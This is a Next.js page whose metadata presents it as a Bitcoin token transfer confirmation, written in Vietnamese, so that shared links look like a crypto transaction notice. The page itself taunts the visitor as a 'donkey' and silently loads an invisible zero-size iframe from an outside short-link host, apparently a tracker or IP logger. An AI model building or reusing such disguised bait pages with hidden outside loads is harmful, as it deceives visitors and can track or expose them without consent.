import Head from 'next/head'
import PropTypes from 'prop-types';
export default function Home() {
  const data = {
    name: 'Token Bitcoin',
    icon: 'https://pasteboard.co/K9NJGSf.x-icon',
    title: 'Xác nhận chuyển khoản Bitcoin Token',
    url: 'https://mongker.cf/',
    image: 'https://www.pngkit.com/png/detail/9-90785_bitcoin-png-transparent-image-gold-bitcoin-coin-png.png',
    description: 'Đây là token xác nhận chuyển khoản token Bitcoin để xác nhận giao dịch',
  };
  return (
    <>
      <Head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>{data.title}</title>
        <meta name="description" content={data.description} />

        <meta name='author' content={data.name} />
        <meta name="keywords" content={data.description} />

        {/* ROBOTS */}
        <meta name='robots' content='index, follow' />

        {/* SEO google, facebook */}
        <meta property='og:description' content={data.description} />
        <meta property='og:url' content={data.url} />
        <meta property='og:title' content={data.title} />
        <meta property='og:type' content='article' />
        <meta property='og:image' content={data.image} />
        <meta property="og:image:width" content="720" />
        <meta property="og:image:height" content="480" />
      </Head>
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', flexDirection: 'column' }}>
        <img src={'https://4.bp.blogspot.com/-k1PJp9KaaWE/XLKZLRgtdtI/AAAAAAAAC_U/gLX9_hMoI8ktHnKXCaGmHdXTeU0gLyyXwCLcBGAs/s400/l%25E1%25BB%25ABa.jpg'} />
        <iframe src='https://maper.info/X6uyi' height={0} width={0} />
        <h1>Đồ con lừa !!!! Ahihi</h1>
      </div >
    </>
  )
}
